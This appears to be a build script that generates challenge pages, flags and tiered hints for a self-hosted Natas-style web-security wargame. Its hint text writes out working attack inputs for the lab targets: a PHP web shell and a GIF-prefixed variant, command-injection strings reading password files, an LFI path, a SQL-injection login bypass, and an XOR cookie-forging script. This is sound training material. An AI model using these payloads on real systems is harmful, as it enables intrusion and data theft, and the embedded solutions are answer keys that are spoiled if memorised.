import os
import json
import re

from hint_economy import managed_tiers


def _flags_yaml(flag) -> str:
    """A challenge's `flag` field is either a plain string (the historical
    shorthand -- ctfcli treats it as a static, case-sensitive flag) or a
    dict (per_team_dynamic and any future non-static type) -- ctfcli's
    _create_flags() POSTs a non-string entry to /api/v1/flags verbatim, so
    the dict's keys must already match that API's real fields
    (type/content/data)."""
    if isinstance(flag, dict):
        lines = [f"  - type: {flag['type']}\n"]
        lines.append(f"    content: \"{flag['content']}\"\n")
        if "data" in flag:
            lines.append(f"    data: \"{flag['data']}\"\n")
        return "".join(lines)
    return f'  - "{flag}"\n'


# Self-hosted image references (see docs/self-hosted-wargames-blueprint.md
# Phase 4's "Wire Natas into CTFd" task). Neither is published by a CI
# workflow yet -- until it is, build+tag locally with these exact names
# before deploying:
#   docker build -t ghcr.io/stoptalkingishh/cei-labs-wargames/natas-target:latest targets/natas
# attacker_image is cei-labs-engine's own extended kali-novnc image (per
# resolved Decision 2 -- not a new separate image), not something this
# repo builds.
NATAS_TARGET_IMAGE = os.environ.get(
    "NATAS_TARGET_IMAGE",
    "ghcr.io/stoptalkingishh/cei-labs-wargames/natas-target:latest",
)
NATAS_ATTACKER_IMAGE = os.environ.get(
    "NATAS_ATTACKER_IMAGE",
    "ghcr.io/stoptalkingishh/cei-labs-wargames/natas-attacker:latest",
)

# All 15 challenges share ONE instance_group -- launching any of them
# creates/reuses the SAME per-team range (one shared attacker + this
# level's target, joined only to that range's private network). Only the
# final level opts into shutdown_on_solve.
INSTANCE_GROUP = "natas"

# A player's connection details (attacker host/port, live status) come
# from the "Launch Environment" control on this challenge itself --
# injected into the challenge view by cei-labs-engine's instance-launcher
# plugin, not written into these descriptions, since the port is only
# known once an instance actually exists. See the "Natas: Start Here"
# challenge for how that control works, and for an explanation of the
# two-hop model this note summarizes below.
#
# Natas is target-attacker, not single-target: everything happens FROM
# inside your attacker workstation (reachable via noVNC; SSH is usable only
# when the platform supplies credentials) -- the targets are never reachable
# directly. All 15
# levels share ONE attacker and ONE target box; each level is just a
# different port (8000 + level number) on that same target, matching the
# real OverTheWire Natas layout. The "Get there" block built by
# _get_there() is repeated verbatim in every level below so it stands on
# its own even if a player skips the "Start Here" challenge or the
# injected UI fails to load for any reason. Each level's description is
# assembled in the generation loop below as:
#   ## Goal / --- / ### Get there (numbered steps + curl-auth blockquote)
#   / ### The task / **Commands you may need:** / **Helpful reading:**
def _credentials(level: int) -> tuple:
    """Per-level login phrasing and curl credential string.

    Level 0 uses the well-known natas0/natas0 pair; every later level
    authenticates as natasN with the previous level's flag.
    """
    if level == 0:
        return "password `natas0`", "natas0"
    return f"the flag from Natas {level - 1} as your password", f"<flag from Natas {level - 1}>"


def _get_there(level: int) -> str:
    """Build the numbered '### Get there' block plus the curl-auth
    blockquote for one level (port 8000 + level number)."""
    cred_phrase, cred_curl = _credentials(level)
    return (
        "### Get there\n"
        "1. Launch the environment and open your **attacker workstation** (noVNC, or SSH if the platform supplied credentials) "
        "from the launch panel \u2014 everything below happens inside it, not on your own machine.\n"
        f"2. Browse to `http://<target-host>:{8000 + level}/`, where `<target-host>` is the "
        "**Target** value in that panel (NOT the **Host** field \u2014 that one is only for "
        "SSH-ing into the attacker itself).\n"
        f"3. Log in as `natas{level}` with {cred_phrase}.\n\n"
        f"> **Using curl?** Authenticate every request: `curl -u 'natas{level}:{cred_curl}' ...`. "
        "A bare request gets `401 Unauthorized` before it reaches the level."
    )

# Define the dataset for Natas Levels 0 to 14 based on OTW specifications
challenges_data = [
    {
        "id": "natas-start-here",
        "name": "Natas: Start Here",
        "points": 10,
        "desc": (
            "## Goal\n"
            "Learn the launch controls, then prove you used them.\n\n"
            "---\n\n"
            "### How Natas is different\n"
            "Natas works differently from Bandit and Krypton: launching gives you a shared "
            "**attacker workstation**, not a direct connection to a target. Every one of "
            "Natas's 15 level endpoints are reachable only from inside that workstation -- never "
            "directly from your own machine.\n\n"
            "### The launch controls\n"
            "The launch control attached to this (and every other Natas) challenge offers:\n"
            "- **Launch Environment** -- starts your attacker workstation and this track's "
            "shared target box (all 15 level endpoints share one target, distinguished by port). "
            "Provides a noVNC link (a full desktop in your browser); use SSH only when the "
            "platform has supplied credentials.\n"
            "- **Reboot Host** -- restarts your attacker in place if it gets stuck.\n"
            "- **Relaunch Environment** -- destroys and recreates your whole range (attacker "
            "and target) from scratch. Use this if something's broken beyond a reboot.\n"
            "- **+5 more minutes** -- shows up only once every level in this track is solved "
            "and a shutdown countdown has started.\n\n"
            "### Prove you found it\n"
            "Click Launch, then open the attacker workstation using the supported **noVNC** link "
            "specifically (the required information is visible only on the desktop "
            "itself). The moment the desktop loads, its wallpaper already has your answer "
            "on it -- no file to go read, no login to figure out. The small line directly "
            "under the large NATAS logo (not the logo itself, and not the smaller \"CEI "
            "LABS\" line below that) is your flag -- copy it word for word, spaces included."
        ),
        "flag": "WELCOME TO NATAS"
    },
    {
        "id": "natas-00",
        "name": "Natas 0 -> 1: View Source",
        "points": 200,
        "goal": "Retrieve the password for the next level from the page source.",
        "task": "View the page's HTML source to find the hidden flag.",
        "flag": {"type": "per_team_dynamic", "content": "per-team-dynamic (placeholder, not read)", "data": "natas1"}
    },
    {
        "id": "natas-01",
        "name": "Natas 1 -> 2: Right-Click Block",
        "points": 250,
        "goal": "Find the password on a page that blocks right-clicking.",
        "task": "Blocking right-click doesn't block view-source or devtools -- or just `curl` the page directly.",
        "flag": {"type": "per_team_dynamic", "content": "per-team-dynamic (placeholder, not read)", "data": "natas2"}
    },
    {
        "id": "natas-02",
        "name": "Natas 2 -> 3: Directory Traversal (Files)",
        "points": 300,
        "goal": "Find a password file the page never links to.",
        "task": "The page source only reveals an embedded image path. Explore the directory that image lives in to find where the password file is hidden.",
        "flag": {"type": "per_team_dynamic", "content": "per-team-dynamic (placeholder, not read)", "data": "natas3"}
    },
    {
        "id": "natas-03",
        "name": "Natas 3 -> 4: Web Crawlers (Robots.txt)",
        "points": 350,
        "goal": "Find a path deliberately hidden from search engines.",
        "task": "The page source hints \"there is nothing on this page\" -- but a file exists specifically to tell crawlers what NOT to index. Check it.",
        "flag": {"type": "per_team_dynamic", "content": "per-team-dynamic (placeholder, not read)", "data": "natas4"}
    },
    {
        "id": "natas-04",
        "name": "Natas 4 -> 5: Referer Spoofing",
        "points": 400,
        "goal": "Forge an HTTP header to satisfy an access check.",
        "task": "The page only allows visitors arriving from the NEXT level's own URL -- a page you can't naturally have come from. Forge the `Referer` header (curl's `-e`/`--referer`, or an intercepting proxy) to satisfy the check.",
        "flag": {"type": "per_team_dynamic", "content": "per-team-dynamic (placeholder, not read)", "data": "natas5"}
    },
    {
        "id": "natas-05",
        "name": "Natas 5 -> 6: Cookie Manipulation",
        "points": 450,
        "goal": "Edit a session cookie to change your authorization state.",
        "task": "The page claims you're not logged in. Inspect the cookie it sets and change its value to authorize yourself.",
        "flag": {"type": "per_team_dynamic", "content": "per-team-dynamic (placeholder, not read)", "data": "natas6"}
    },
    {
        "id": "natas-06",
        "name": "Natas 6 -> 7: Hidden Inclusion Files",
        "points": 500,
        "goal": "Read server-side source to find where a secret is stored, then fetch it directly.",
        "task": "The page wants a secret key. Its \"View sourcecode\" link shows where that secret actually lives on the server -- fetch that file directly.",
        "flag": {"type": "per_team_dynamic", "content": "per-team-dynamic (placeholder, not read)", "data": "natas7"}
    },
    {
        "id": "natas-07",
        "name": "Natas 7 -> 8: Local File Inclusion (LFI)",
        "points": 550,
        "goal": (
            "Exploit a Local File Inclusion (LFI) vulnerability to read a file the application was "
            "never meant to serve."
        ),
        # No task body for this level -- the goal already says everything;
        # the description goes straight from "### The task" to the commands
        # line.
        "task": "",
        "flag": {"type": "per_team_dynamic", "content": "per-team-dynamic (placeholder, not read)", "data": "natas8"}
    },
    {
        "id": "natas-08",
        "name": "Natas 8 -> 9: Reversing Crypto Schemes",
        "points": 600,
        "goal": "Reverse a server-side encoding chain to recover a secret.",
        "task": "The page requires a secret key, shown only in encoded form. View the source to see the encoding chain (base64, then reversed, then hex), and reverse it to recover the original secret.",
        "flag": {"type": "per_team_dynamic", "content": "per-team-dynamic (placeholder, not read)", "data": "natas9"}
    },
    {
        "id": "natas-09",
        "name": "Natas 9 -> 10: Command Injection I",
        "points": 650,
        "goal": "Inject a shell command through an unsanitized input field.",
        "task": "Inspect the source and determine how the search input reaches the server-side command. Use that behavior to retrieve the next password.",
        "flag": {"type": "per_team_dynamic", "content": "per-team-dynamic (placeholder, not read)", "data": "natas10"}
    },
    {
        "id": "natas-10",
        "name": "Natas 10 -> 11: Command Injection II (Sanitization Bypass)",
        "points": 700,
        "goal": "Achieve the same result once the easy metacharacters are filtered.",
        "task": "The input filter blocks some characters used by the prior level. Inspect the source and the invoked program's behavior to find another way to retrieve the next password.",
        "flag": {"type": "per_team_dynamic", "content": "per-team-dynamic (placeholder, not read)", "data": "natas11"}
    },
    {
        "id": "natas-11",
        "name": "Natas 11 -> 12: XOR Encryption Bypass",
        "points": 750,
        "goal": "Recover an XOR key and forge encrypted data with it.",
        "task": "Preferences are stored in a cookie protected with a short repeating XOR key. Inspect the source and cookie, recover what you need to forge an authorized preference, and retrieve the next password. `python3` is available for byte-level work.",
        "flag": {"type": "per_team_dynamic", "content": "per-team-dynamic (placeholder, not read)", "data": "natas12"}
    },
    {
        "id": "natas-12",
        "name": "Natas 12 -> 13: Arbitrary File Upload",
        "points": 800,
        "goal": "Exploit insufficient upload validation to retrieve the next password.",
        "task": "Inspect the upload flow and its server-side handling. Determine how the accepted file is exposed, then use the behavior to retrieve the next password.",
        "flag": {"type": "per_team_dynamic", "content": "per-team-dynamic (placeholder, not read)", "data": "natas13"}
    },
    {
        "id": "natas-13",
        "name": "Natas 13 -> 14: File Upload Bypass (Magic Bytes)",
        "points": 850,
        "goal": "Get a PHP payload past a file-type check based on content, not extension.",
        "task": "Same upload flow as the previous level, but the server now checks the file's actual bytes (`exif_imagetype()`) rather than its name or extension.",
        "flag": {"type": "per_team_dynamic", "content": "per-team-dynamic (placeholder, not read)", "data": "natas14"}
    },
    {
        "id": "natas-14",
        "name": "Natas 14 -> 15: SQL Injection (SQLi)",
        "points": 900,
        "goal": "Bypass a login form using SQL injection.",
        "task": "This is the final Natas level. The login form builds its SQL query with raw string concatenation from your username and password fields.",
        "flag": {"type": "per_team_dynamic", "content": "per-team-dynamic (placeholder, not read)", "data": "natas14final"}
    },
    {
        "id": "natas-15", "name": "Natas 15 -> 16: Boolean Response Oracle",
        "points": 950, "goal": "Recover a credential through a constrained boolean validation oracle.",
        "task": "The validation console accepts a narrow account predicate and reveals only whether a matching record exists.",
        "flag": {"type": "per_team_dynamic", "content": "per-team-dynamic (placeholder, not read)", "data": "natas16"}
    },
    {
        "id": "natas-16", "name": "Natas 16 -> 17: Denylist Search Emulator",
        "points": 1000, "goal": "Understand why command-like denylist filtering is not a safe design.",
        "task": "Inspect the bounded archive adapter's source and determine how its legacy reference expansion reaches a hidden training record.",
        "flag": {"type": "per_team_dynamic", "content": "per-team-dynamic (placeholder, not read)", "data": "natas17"}
    },
    {
        "id": "natas-17", "name": "Natas 17 -> 18: Timing Response Oracle",
        "points": 1050, "goal": "Measure an application-layer timing difference without relying on response content.",
        "task": "The verifier gives one message for every candidate; compare repeated, bounded measurements.",
        "flag": {"type": "per_team_dynamic", "content": "per-team-dynamic (placeholder, not read)", "data": "natas18"}
    },
    {
        "id": "natas-18", "name": "Natas 18 -> 19: Predictable Numeric Sessions",
        "points": 1100, "goal": "Assess the risk of a small predictable session identifier space.",
        "task": "The service desk identifies sessions with a bounded numeric cookie.",
        "flag": {"type": "per_team_dynamic", "content": "per-team-dynamic (placeholder, not read)", "data": "natas19"}
    },
    {
        "id": "natas-19", "name": "Natas 19 -> 20: Encoded Weak Session Token",
        "points": 1150, "goal": "Recognize encoding as distinct from session integrity protection.",
        "task": "The ticket portal uses a strict, encoded two-field session ticket.",
        "flag": {"type": "per_team_dynamic", "content": "per-team-dynamic (placeholder, not read)", "data": "natas20"}
    }
]

# "Commands you may need" + "Helpful reading" shown directly in the
# description, free -- matching OverTheWire's own real page structure
# (see build_bandit.py's EXTRA_INFO comment for the full rationale).
EXTRA_INFO = {
    "natas-00": (["curl", "browser view-source"], []),
    "natas-01": (["curl", "browser view-source"], []),
    "natas-02": (["curl"], []),
    "natas-03": (["curl"], [("Robots exclusion standard on Wikipedia", "https://en.wikipedia.org/wiki/Robots.txt")]),
    "natas-04": (["curl"], []),
    "natas-05": (["curl", "browser devtools"], []),
    "natas-06": (["browser view-source", "curl"], []),
    "natas-07": (["curl", "browser view-source"], [("File inclusion vulnerability on Wikipedia", "https://en.wikipedia.org/wiki/File_inclusion_vulnerability")]),
    "natas-08": (["browser view-source", "base64", "xxd", "rev"], []),
    "natas-09": (["browser view-source", "curl"], []),
    "natas-10": (["browser view-source", "curl"], []),
    "natas-11": (["browser devtools", "base64", "xxd", "python3"], [("XOR cipher on Wikipedia", "https://en.wikipedia.org/wiki/XOR_cipher")]),
    "natas-12": (["browser view-source", "curl"], []),
    "natas-13": (["browser view-source", "curl"], []),
    "natas-14": (["browser view-source"], [("SQL injection on Wikipedia", "https://en.wikipedia.org/wiki/SQL_injection")]),
    "natas-15": (["curl"], []), "natas-16": (["curl"], []), "natas-17": (["curl"], []),
    "natas-18": (["curl"], []), "natas-19": (["curl", "base64"], []),
}

# One real, technique-specific hint per level (not natas-start-here --
# its description is already a full walkthrough). See build_bandit.py's
# HINTS comment for the tier structure; hints are wallet-manifest-only
# (JSON, where json.dump handles quoting), never the hand-built YAML, so
# literal double-quotes in payloads (e.g. SQLi syntax) are fine.
HINTS = {
    'natas-00': [
        "A webpage you see in your browser isn't the whole story -- what you're looking at is the browser's own rendering of a plain text file the server sent it. That rendering step hides some of what's actually in the file, with nothing showing up on screen for it. What might be sitting in that raw text that never makes it to the screen?",
        "HTML supports comments -- text wrapped in `<!-- -->` -- that the browser parses straight past without ever displaying them, the same way it silently processes `<script>` tags or CSS instead of printing them as visible text. Developers use comments to leave themselves notes: reminders, TODOs, and sometimes something they shouldn't have left in at all. Because comments never render, the only way to see one is to skip rendering entirely and read the raw text the server actually sent.",
        "Two ways to get the raw text: your browser's own view-source mode (Ctrl+U, or type `view-source:` before the URL), or a plain request from the command line with curl.\n\nIllustrative example only -- your real value will differ:\n```\n$ curl http://<target-host>:8000/\n<html>\n<!-- The password for natas1 is <the next password> -->\n</html>\n```\nThe password sits right inside an HTML comment.",
    ],
    'natas-01': [
        "The page tries to stop you right-clicking -- but right-click is just one specific way of asking your browser to show you something. If a restriction is enforced by code running IN your browser, is there any way to see the same content that avoids the browser's own UI entirely?",
        "Right-click/context-menu blocking is JavaScript running inside YOUR browser -- it can only interfere with browser UI elements like the context menu, never with how the page's actual content was retrieved in the first place. That content already arrived as plain HTML before any of that JavaScript even ran. Anything that skips the rendered page entirely, and skips the JavaScript along with it, sees the same raw content untouched.",
        "View-source mode (`view-source:http://<target-host>:8001/` in the address bar, or Ctrl+U) or a plain `curl http://<target-host>:8001/` both retrieve the exact same HTML the JavaScript is trying to protect -- same pattern as the last level, the password is in an HTML comment.\n\nIllustrative example only -- your real value will differ:\n```\n$ curl http://<target-host>:8001/\n<!-- The password for natas2 is <the next password> -->\n```",
    ],
    'natas-02': [
        "The page shows an image, and that image has to live SOMEWHERE on the server -- a path you can see if you look at how the page actually references it. What else might be sitting in that same location, unlinked from the page itself?",
        "View the page source and find the image's path -- something like `files/pixel.png`. Many simple web servers, unless deliberately configured otherwise, will list the FULL CONTENTS of a folder if you request the folder itself instead of one specific file inside it. That's worth trying here -- the image doesn't have to be the only thing sitting in that directory.",
        "Request the directory path itself rather than the image file, e.g. `curl http://<target-host>:8002/files/`. If directory listing is enabled, this prints every file inside, including one holding the password.\n\nIllustrative example only -- your real filenames/value will differ:\n```\n$ curl http://<target-host>:8002/files/\nIndex of /files\npixel.png\nusers.txt\n$ curl http://<target-host>:8002/files/users.txt\nnatas3:<the next password>\n```",
    ],
    'natas-03': [
        "Search engines don't crawl a website blindly -- there's a standard way for a site owner to tell a crawler which pages NOT to index. That instruction file has to be public for a crawler to read it in the first place. What does 'telling a crawler not to look somewhere' actually reveal to anyone else who reads the same file?",
        "The file is called `robots.txt`, and it always lives at the root of a site by convention (`/robots.txt`). Site owners list paths they don't want indexed inside it -- but a crawler isn't the only thing that can read a plain text file sitting at a public URL. Listing a path there, meant to keep it out of search results, is itself a public announcement of exactly where that path is.",
        "`curl http://<target-host>:8003/robots.txt` fetches that file directly -- it lists a path the owner didn't want indexed. Request that path directly to find the password.\n\nIllustrative example only -- your real path/value will differ:\n```\n$ curl http://<target-host>:8003/robots.txt\nUser-agent: *\nDisallow: /s3cr3t/\n$ curl http://<target-host>:8003/s3cr3t/users.txt\nnatas4:<the next password>\n```",
    ],
    'natas-04': [
        "Every time your browser loads a page, it's really just having a conversation with a server: your browser sends a request, the server sends back a response. That request isn't only 'give me this page' -- it also carries extra bits of information called headers, things like what browser you're using, or what page you clicked the link from. Your browser normally fills these in without you ever seeing them. This level's access check is built entirely around one of those headers. What might a server want to know about where a visitor came from, and why would that be an easy thing to fake?",
        "One of those request headers is called `Referer` (yes, it's a historical misspelling) -- it tells the server what page you were on when you clicked the link that got you here. Browsers set it automatically, so a server can treat it as a rough signal: 'this visitor arrived from where I expect them to.' But that signal is weaker than it sounds -- the browser only sets it as a courtesy, nothing enforces it. You can build your own request by hand and put whatever value you like in that header. Try loading the page normally first: you won't have arrived from the right place, so it'll refuse you -- but read the refusal message closely. Developers often write these denial messages to help themselves debug, which means they frequently spell out the exact value they were expecting. Once you know that, the only step left is sending a request that claims to come from there.",
        "You can build a request with a custom header two ways: from the command line with curl, or through your browser's own devtools.\n\nCommand line -- first just request the page plainly and see what it says:\n```\n$ curl http://<target-host>:8004/\nAccess denied. You must come from http://<target-host>:8005/\n```\nThat error tells you exactly what Referer it wants (in this deployment, it's your same host, one port number higher than the one you're already using). Now resend the request with curl's `-e` (or `--referer`) flag set to that exact value:\n```\n$ curl -e 'http://<target-host>:8005/' http://<target-host>:8004/\nAccess granted. The password for natas5 is <the next password>\n```\n\nBrowser devtools -- press F12, open the Network tab, and reload the page. Click the request for `/` in the list, right-click it, and choose 'Copy as cURL' -- this hands you the exact request your browser just sent, headers and all, as a ready-to-edit curl command. Swap the `Referer` value for the one the page told you it wanted, run it, and you'll get the same result.\n\nEither way, the password shows up directly in the 'Access granted' response.",
    ],
    'natas-05': [
        "The page claims you're 'not logged in' -- but a normal website has to remember that state SOMEWHERE between one request and the next, since each HTTP request otherwise arrives with no memory of the one before it. What's the usual mechanism a server uses to keep track of you across separate requests?",
        "That mechanism is a cookie: a small piece of data the server tells your browser to store and send back automatically on every later request. The server trusts whatever value comes back in that cookie completely -- it's just data your browser is carrying on the server's behalf, and nothing stops you from reading and changing that value yourself before you send it.",
        "`curl -v http://<target-host>:8005/` (the `-v` flag shows response headers, including any `Set-Cookie`) reveals a cookie that looks boolean-ish, like `loggedin=0`. Resend the request with that value flipped.\n\nIllustrative example only -- your real value will differ:\n```\n$ curl -v http://<target-host>:8005/ 2>&1 | grep Set-Cookie\n< Set-Cookie: loggedin=0\n$ curl -b 'loggedin=1' http://<target-host>:8005/\nYou are logged in. The password for natas6 is <the next password>\n```",
    ],
    'natas-06': [
        "The page wants a 'secret' value typed into a form -- but where would that secret actually be checked against, and could the code doing that checking itself be visible to you somewhere?",
        "The page's PHP code pulls in ('includes') the real secret from a separate file, rather than hardcoding it directly in the visible page logic. If you can read the source of that PHP file rather than only interacting with the rendered form, it will tell you exactly which file the secret actually lives in -- and once you know the path, you can request that file directly, the same way you'd request any other page.",
        "Click 'View sourcecode' on the page to see the PHP, which `include`s a secret from a specific relative path (e.g. `includes/secret.inc`). Request that exact path directly as a URL to read the secret in plain text, then submit it in the form.\n\nIllustrative example only -- your real path/value will differ:\n```\n$ curl http://<target-host>:8006/includes/secret.inc\n<?php\n$secret = '<the real secret value>';\n$ curl --data-urlencode 'secret=<value from above>' http://<target-host>:8006/index.php\nThe password for natas7 is <the next password>\n```",
    ],
    'natas-07': [
        "The page changes what it shows based on something in the URL itself -- a parameter picking between pages like 'Home' and 'About.' If that parameter is used to build a file path on the server with no checks at all, what else might you be able to make it point at?",
        "View the source: the URL parameter (commonly `page`) is passed straight into a file-read function with no validation. That means you're not limited to the two pages the developer intended -- you control the file path directly, including files completely outside the site's own folder, as long as the web server process has permission to read them.",
        "Replace the parameter's value with an absolute path to a file you want -- no `../` traversal needed since it's already an absolute path.\n\nIllustrative example only -- your real value will differ:\n```\n$ curl 'http://<target-host>:8007/index.php?page=/etc/natas_webpass/natas8'\n<the next password>\n```",
    ],
    'natas-08': [
        "The page shows a secret in ENCODED form and checks whatever you type against the same encoding applied to your input. If you can see the exact steps used to encode it, what would running those same steps backward, in reverse order, do to the encoded value?",
        "Click 'View sourcecode' to see the encoding function used: base64-encode, then reverse the string, then hex-encode. Each of those steps has an exact inverse (hex-decode, reverse again, base64-decode), and undoing a chain of operations means applying the inverses in the OPPOSITE order they were originally applied -- last step first.",
        "Hex-decode the shown value first, then reverse that resulting string, then base64-decode what's left. All three commands are installed on the Natas attacker; run `natas-help` if you need the tool list. This level's encoded value is fixed, so the command below is directly runnable:\n```\n$ echo 3d3d77594d523151485a445330306d5344526d594e74455779556b4e5942545a43685751 | xxd -r -p | rev | base64 -d\n<the decoded form secret>\n```\nSubmit the decoded result as the secret.",
    ],
    'natas-09': [
        "The page runs a search over a word list based on text you type in -- and 'runs a search' on the server usually means some underlying program is actually being executed to do that searching. What happens if the text you type isn't just treated as a search term, but as part of the actual command line?",
        "View the source: your search input is passed straight into a shell command (a `grep`) with no sanitization at all. That means any character with special meaning to a shell, like a semicolon, which ends one command and starts a new one, gets interpreted by the shell itself rather than treated as plain search text.",
        "A needle like `;cat /etc/natas_webpass/natas10` closes off the intended `grep` command with `;` and runs your own `cat` right after it.\n\nIllustrative example only -- your real value will differ:\n```\n$ curl 'http://<target-host>:8009/index.php?needle=;cat+/etc/natas_webpass/natas10'\n<grep output>\n<the next password>\n```\n(URL-encode the semicolon as `%3B` if your client won't send it raw.)",
    ],
    'natas-10': [
        "The same underlying search mechanism as the last level is still here, but now the obvious special characters are blocked. Command injection isn't only about shell metacharacters, though -- a command itself can accept extra arguments beyond the ones the developer intended.",
        "`grep`, the command this page runs, accepts a SECOND filename as a plain word on its command line -- a file to search IN ADDITION to the intended one. That's a completely ordinary, non-malicious-looking argument, not a shell metacharacter at all, so it slips past filters that only block things like `;` or `|`.",
        "A needle of `. /etc/natas_webpass/natas11 #` needs no blocked character: the lone `.` is a regex matching every line, the second word is `grep`'s additional file to search, and the trailing ` #` is a shell comment that drops the rest of the real command line once it reaches the shell.\n\nIllustrative example only -- your real value will differ:\n```\n$ curl --data-urlencode 'needle=. /etc/natas_webpass/natas11 #' http://<target-host>:8010/index.php\n<the next password>\n```",
    ],
    'natas-11': [
        "Your preferences are stored in a cookie, but this time it's encrypted, not plain text. Encryption hides content from someone who doesn't have the key -- but does it hide content from someone who already knows exactly what the original, unencrypted version looks like?",
        "The cookie is XOR-encrypted with a short key that repeats across the data. XOR has a very specific, useful property: if you know both the plaintext and the resulting ciphertext, XOR-ing them together recovers the key that produced that ciphertext. You don't know the key directly, but you DO know what the DEFAULT, logged-out preferences look like (a fixed JSON structure the source reveals), which gives you a known plaintext to work from.",
        "Base64-decode the default cookie to get the raw XOR-encrypted bytes, then XOR those bytes against the exact known default JSON to recover the repeating key. Build a new JSON value with `showpassword` changed to `yes`, XOR-encrypt it with that recovered key, base64-encode it, URL-encode it, and set it as your `data` cookie.\n\nPaste your current `data` cookie into this offline helper:\n```python\nimport base64\nimport urllib.parse\n\ncookie = urllib.parse.unquote(input('data cookie: ').strip())\nciphertext = base64.b64decode(cookie)\nknown = b'{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}'\nstream = bytes(c ^ p for c, p in zip(ciphertext, known))\nperiod = next(\n    n for n in range(1, len(stream) + 1)\n    if all(stream[i] == stream[i % n] for i in range(len(stream)))\n)\nkey = stream[:period]\nwanted = b'{\"showpassword\":\"yes\",\"bgcolor\":\"#ffffff\"}'\nforged = bytes(b ^ key[i % len(key)] for i, b in enumerate(wanted))\nprint(urllib.parse.quote(base64.b64encode(forged).decode(), safe=''))\n```",
    ],
    'natas-12': [
        "The page lets you upload a file. It probably expects an image -- but does it actually check that what you upload IS an image, or only that it looks like one from the outside?",
        "The upload form accepts any file with no real validation of its actual content or type. That means you're not limited to real images at all -- you could upload a file containing server-side code instead. Once that file sits somewhere the web server will execute code from, requesting its URL afterward runs whatever's inside it.",
        "Create a tiny PHP file containing a minimal 'web shell' that runs whatever shell command you pass it, upload it through the form, and note the path it was saved to. Request that URL with a `c` parameter.\n\nIllustrative example only -- your real upload path/value will differ:\n```\n$ echo '<?php system($_GET[c]); ?>' > shell.php\n<upload shell.php through the form -- note the path it reports back, e.g. upload/abc123.php>\n$ curl 'http://<target-host>:8012/upload/abc123.php?c=cat+/etc/natas_webpass/natas13'\n<the next password>\n```",
    ],
    'natas-13': [
        "This time the server actually checks the file's content before accepting it, not just the filename or extension. But a check that only looks at the first few BYTES of a file doesn't necessarily look at everything else that comes after them.",
        "The server inspects a file's opening bytes for a known 'magic number' signature that identifies real image formats. Nothing stops a file's very first bytes from matching a real image signature while the rest of the file remains completely different content, like working PHP code sitting right after that signature.",
        "Prepend the literal bytes `GIF89a` (a real GIF signature) to the very start of your PHP web shell, before the `<?php` tag. The magic-byte check only reads those first bytes and is satisfied it's a GIF; PHP doesn't care what comes before `<?php` in the file, so it still executes once uploaded and requested.\n\nIllustrative example only -- your real upload path/value will differ:\n```\n$ printf 'GIF89a<?php system($_GET[c]); ?>' > shell.php\n<upload shell.php -- passes the magic-byte check as a GIF>\n$ curl 'http://<target-host>:8013/upload/xyz789.php?c=cat+/etc/natas_webpass/natas14'\n<the next password>\n```",
    ],
    'natas-14': [
        "The login form checks a username and password against a database, most likely by building a query out of exactly what you typed and running it. If your input becomes part of that query's actual TEXT rather than being kept separate from it, what else could you make the query do besides just checking a password?",
        "Click 'View sourcecode': the login query is built by directly gluing your username and password INTO a SQL string, with no escaping at all. That means a quote character you type doesn't stay 'just data' -- it can close the string the developer intended early and let you add your own SQL logic that the database executes as part of the real query. Pay attention to which quote character the source itself uses to wrap each field, since your input needs to match that same style to actually close the string.",
        'The query wraps each field in DOUBLE quotes and concatenates them directly, so a username like `" OR "1"="1" -- ` (matching that double-quote style -- note the trailing space after the double-dash, which comments out the rest of the original query) closes the string early, adds an always-true condition, and comments out everything after it.\n\nIllustrative example only -- your real value will differ:\n```\n$ curl --data-urlencode \'username=" OR "1"="1" -- \' --data-urlencode \'password=x\' http://<target-host>:8014/index.php\nLogged in. The FINAL Natas flag is <the final password>\n```',
    ],
    'natas-15': ["Observe the two stable outcomes.", "The accepted grammar is deliberately narrow; compare prefixes one position at a time.", "Automate small, bounded prefix probes and keep only candidates that produce the positive outcome."],
    'natas-16': ["This is an emulator, not a shell.", "The punctuation denylist is applied before a legacy reference-expansion step.", "Use the source view to learn the strict expansion grammar, then use its documented reference rather than a literal catalog query."],
    'natas-17': ["The response text is intentionally uniform.", "Compare several requests for each candidate rather than trusting one measurement.", "A matching prefix takes longer application work; enumerate conservatively."],
    'natas-18': ["The session cookie is numeric.", "Its accepted range is small and the service has one local elevated record.", "Test bounded numeric identifiers rather than guessing unbounded values."],
    'natas-19': ["The ticket is encoded, not signed.", "Decode it as a strict two-field text record.", "Change only a valid field value, then re-encode using the URL-safe token alphabet."],
}

HINT_TITLES = (
    "Step 1 — Notice",
    "Step 2 — Understand",
    "Step 3 — Try it",
)


def _curl_auth_note(challenge_id: str) -> str:
    """Return a copy/pasteable reminder for Natas's HTTP Basic Auth.

    Browser logins can hide this detail by caching credentials. Command-line
    requests cannot: an otherwise-correct exploit just receives a 401 unless
    curl is given the current level's username and password.
    """
    level = int(challenge_id.rsplit("-", 1)[1])
    password = "natas0" if level == 0 else f"<flag from Natas {level - 1}>"
    return (
        f"**Authenticate every curl request:** use "
        f"`curl -u 'natas{level}:{password}' ...`. A bare curl request will "
        "receive `401 Unauthorized` before it reaches the level."
    )


def _render_hint(challenge_id: str, tier_number: int, content: str) -> str:
    """Add a readable tier heading and make every shell example executable."""
    level = int(challenge_id.rsplit("-", 1)[1])
    password = "natas0" if level == 0 else f"<flag from Natas {level - 1}>"
    authenticated = re.sub(
        r"(?m)^(\$ )curl ",
        rf"\1curl -u 'natas{level}:{password}' ",
        content,
    )
    return f"### {HINT_TITLES[tier_number - 1]}\n\n{_curl_auth_note(challenge_id)}\n\n{authenticated}"

def _require(condition: bool, message: str) -> None:
    if not condition:
        raise ValueError(message)


def _validate_natas_content() -> None:
    """Keep the hint wallet aligned with the challenge set, mirroring
    build_bandit.py's / build_krypton.py's validators."""
    challenge_ids = {challenge["id"] for challenge in challenges_data}
    # Every HINTS key must be a real challenge, and every challenge except
    # natas-start-here (whose description is already a full walkthrough)
    # must have wallet coverage.
    for challenge_id in HINTS:
        _require(challenge_id in challenge_ids, f"HINTS key {challenge_id} has no matching challenge")
    for challenge_id in challenge_ids:
        if challenge_id == "natas-start-here":
            continue
        _require(challenge_id in HINTS, f"{challenge_id} is missing hint-wallet coverage")

    hint_text = "\n".join(content for tiers in HINTS.values() for content in tiers)
    _require("man " not in hint_text, "Natas hints must use image-supported built-in help")
    for challenge_id, tiers in HINTS.items():
        _require(len(tiers) == 3, f"{challenge_id} must have exactly three managed hint tiers")


_validate_natas_content()

# Generate folder and files
script_dir = os.path.dirname(os.path.abspath(__file__))
base_dir = os.path.abspath(os.path.join(script_dir, "..", "challenges"))
